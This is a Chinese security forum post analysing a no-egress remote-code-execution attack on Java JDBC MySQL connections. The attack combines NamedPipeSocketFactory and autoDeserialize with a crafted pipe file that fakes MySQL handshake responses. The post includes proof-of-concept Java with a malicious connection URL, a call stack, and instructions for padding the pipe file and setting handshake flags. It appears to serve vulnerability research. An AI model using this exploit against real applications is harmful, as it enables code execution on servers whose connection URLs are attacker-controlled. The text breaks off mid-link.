---
title: JDBC Mysql不出网攻击-NamedPipeSocket原理剖析
url: https://forum.butian.net/share/4705
source: 奇安信攻防社区
date: 2026-01-04
fetch_date: 2026-01-05T03:51:13.459046
---

# JDBC Mysql不出网攻击-NamedPipeSocket原理剖析

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### JDBC Mysql不出网攻击-NamedPipeSocket原理剖析

* [漏洞分析](https://forum.butian.net/topic/48)

从JDBC Mysql利用NamedPipeSocket实现不出网RCE到Mysql Handshake协议流量分析，理解FakeMysql Server实现原理，学习如何构造PipeFile来实现攻击

在不出网的情况下，如下代码该如何利用？
```java
String url = "jdbc:mysql://localhost:3306/" + dbname + "?useUnicode=true&characterEncoding=utf-8&useSSL=false";
Connection connection = DriverManager.getConnection(url, "root", "root");
```
通过学习文章<https://xz.aliyun.com/news/17830>，可以知道用 NamedPipeSocketFactory 去打 JDBC 反序列化，然后通过 SpingBoot 上传临时文件，但在复现过程中我通过 java-chains 生成 Pipe 时发现当我输入 password 时会导致利用失败，为了解决疑问记录此篇文章。
漏洞原理
====
调用栈：
```markdown
getObject:1402, ResultSetImpl (com.mysql.cj.jdbc)
resultSetToMap:91, ResultSetUtil (com.mysql.cj.jdbc.util)
populateMapWithSessionStatusValues:72, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)
preProcess:86, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)
preProcess:62, V1toV2StatementInterceptorAdapter (com.mysql.cj.jdbc.interceptors)
preProcess:73, NoSubInterceptorWrapper (com.mysql.cj.jdbc.interceptors)
invokeStatementInterceptorsPre:1392, MysqlaProtocol (com.mysql.cj.mysqla.io)
sqlQueryDirect:1108, MysqlaProtocol (com.mysql.cj.mysqla.io)
sqlQueryDirect:445, MysqlaSession (com.mysql.cj.mysqla)
execSQL:2052, ConnectionImpl (com.mysql.cj.jdbc)
execSQL:2014, ConnectionImpl (com.mysql.cj.jdbc)
executeQuery:1424, StatementImpl (com.mysql.cj.jdbc)
loadServerVariables:2948, ConnectionImpl (com.mysql.cj.jdbc)
initializePropsFromServer:2456, ConnectionImpl (com.mysql.cj.jdbc)
connectOneTryOnly:1817, ConnectionImpl (com.mysql.cj.jdbc)
createNewIO:1673, ConnectionImpl (com.mysql.cj.jdbc)
<init>:656, ConnectionImpl (com.mysql.cj.jdbc)
getInstance:349, ConnectionImpl (com.mysql.cj.jdbc)
connect:221, NonRegisteringDriver (com.mysql.cj.jdbc)
getConnection:664, DriverManager (java.sql)
getConnection:270, DriverManager (java.sql)
```
在 JDBC 连接数据库后会执行`SHOW VARIABLES`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-9e52a99bdea337e5c7a1cb8280f938b851ff32e0.png)
当查询结果类型为 BLOB 时则会进行反序列化
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-bef2bc2c5b0a8f6583b40d54cc04b5734f222a32.png)
漏洞复现及探索分析
=========
复现环境： jdk-17
使用 java-chains 生成利用链
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-8483cb583be65f9cade0fc92fc218d9a5d93fc85.png)
测试代码如下
```java
public class MysqlExp {
public static void main(String[] args) throws SQLException {
String url = "jdbc:mysql://xxx:8080/test?user=mysql&useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath=calc.txt";
Connection connection = DriverManager.getConnection(url);
}
}
```
运行弹出计算器，为贴合实际环境，我将代码改为 `DriverManager.getConnection(url, "username", "password")`发现利用失败了
解决疑问
====
调试跟进`getConnection`方法，这里会把参数中的 user 和 password 存入 info
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-85b03356d250af7f74461d84c65863c3dc34e1a6.png)
后续在com.mysql.cj.core.ConnectionString#ConnectionString 中解析 url 中的参数和 info 合并
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-b183f08dbb86d9e82756ae841f041e41d459961b.png)
深入解析方法可以看到 info 是在最后处理的，会覆盖掉 url 中原本存在的 user 还有 password
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-0bdc3b206cdd4592147283cfbc8ea7431670e90c.png)
回到 java-chains 可以看到在生成 PipeFile 时需要填入一个 user 的参数，默认为 mysql
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-43ac10d4e939c23799247052e66441928bad9a0f.png)
那么如果现在有如下一个环境
```java
String url = "jdbc:mysql://localhost:3306/" + dbname + "?useUnicode=true&characterEncoding=utf-8&useSSL=false";
Connection connection = DriverManager.getConnection(url, "root", "root");
```
这个时候只有 dbname 可控，显然对 url 后续的参数是完全可控的，user 也可以根据需要修改为 root，但是 password 在 java-chains 并未支持自定义
\*\*看到这里突然意识到一个问题：PipeFile 是一个什么文件，为什么还使用了错误的 user 和 password 会导致利用失败，难道与文件通信还需要鉴权吗？\*\*
NamedPipeSocket 是什么
-------------------
遇到不会的问题就去问 AI
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-fdec1274df18069c9c4dd31e0f517d4753aefa9b.png)
那什么又是 Named Pipe 命名管道呢？
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-49c6e6003ff551076e18f860c4588216fc856742.png)
经过与 AI 的深入交流，输出自己的理解：命名管道是一个通道，在 Linux 系统上可以体现为一个文件，它是通信的媒介，简单理解就是\*\*请求就写入文件，响应就读取文件\*\*，如下为 AI 给出的通信过程。
```java
JDBC: CreateFile("\\.\pipe\mysql")
MySQL: Accept named pipe client
JDBC: WriteFile → CLIENT\_HANDSHAKE
MySQL: ReadFile
MySQL: WriteFile → SERVER\_HANDSHAKE
JDBC: ReadFile
JDBC: WriteFile → LOGIN\_REQUEST
MySQL: ReadFile
MySQL: WriteFile → OK\_PACKET
JDBC: ReadFile
JDBC: WriteFile → QUERY("SELECT 1")
MySQL: ReadFile
MySQL: WriteFile → RESULTSET
JDBC: ReadFile
JDBC: close()
MySQL: Disconnect pipe
```
1. JDBC 创建`NamedPipe`，Mysql 响应时写入
2. JDBC 读取文件获取响应，请求即写入文件
3. Mysql 读取文件即获取客户端响应
明白原理后，豁然开朗：
\*\*构造的恶意NamedPipe 实际上是不存在 Server 端的，只是在文件合适的位置放置 Mysql 响应以提供 JDBC 去读取，所以当输入密码后由于 JDBC 写入（请求）文件的字节数变多，从而导致溢出，导致原本防止 Mysql 响应的字节丢失，从而无法正确读取响应抛出异常\*\*
即然是这样，那么 JDBC 的写入内容我们根本无需理会，只需要关注写入的长度就好了，那之前使用 java-chains 生成的 NamedPipe 填写的用户名虽然是 mysql，但实际上在利用时只需要让 username 长度为 5 就好了，运行代码发现确实如此。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-0dfd16e5e1627f654a488b56b66ef04dbddbee30.png)
Mysql Handshake 流量分析
--------------------
在构造NamedPipe 时，其实我们只需要预留足够长度的空间提供 JDBC 写入，然后再在之后位置写入 Mysql 响应即可，而需要 JDBC 写入的空间完全可以填写空字节占位就好了
通过抓包来看一下 Mysql 的通信过程，使用如下命令，否则流量会被 TSL 加密
```java
mysql --ssl-mode=DISABLED -u username -p -h hostname
```
使用 Mysql 版本为 5.7.43
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-84d3868768be119d431bdfb05c0127a673012dde.png)
蓝色为 mysql 响应，红色为客户端请求，针对每一段进行解析，重点关注长度：
1. mysql 响应，重点影响长度的因素为版本号和最后的密码认证方式（mysql\\_native\\_password 和 mysql\\_clear\\_password 只是其中 2 种），mysql\\_clear\\_password 即明文传输，但客户端不与服务端协商（即使返回mysql\\_clear\\_password 后续也会提交加密后的密码）
2. 客户端请求，重点关注长度为 204 字节，其中重点包含 username 和加密后的 password
3. mysql 响应，表示登陆成功，使用错误密码登陆流量如下
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-d4a34f1eda06837da2200d6e09d146f85c23d816.png)
4. 后续均为客户端执行语句即 mysql 响应
到此就可以开始构造NamedPipe 文件了，先编辑如下文件，然后使用 JDBC 去连接，获取请求
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-e42412fdbe684ad40eaa07edb2f84a0711953a6e.png)
```java
public class MysqlExp {
public static void main(String[] args) throws SQLException {
String url = "jdbc:mysql://xxx:8080/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath=self.txt";
Connection connection = DriverManager.getConnection(url, "username", "password");
}
}
```
运行之后新增 230 字节
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-bf7130274442e8861dff9eb149d0fc96dcca7c88.png)
后续再添加`0700000200000002000000`标识登陆成功
但这样还不够，客户端侧返回了太多版本信息，我们根本无法预料该留多少字节，这块看了一下响应包中的一些标志位
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-b4135bf7ae26b7a80bc3848556002b0f9b90afba.png)
经过不懈努力，将 PLugin Auth 标志位置为 0 就可以实现
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-cb71c4178714ff6fcdfbc0709d19e743e3371c99.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/20...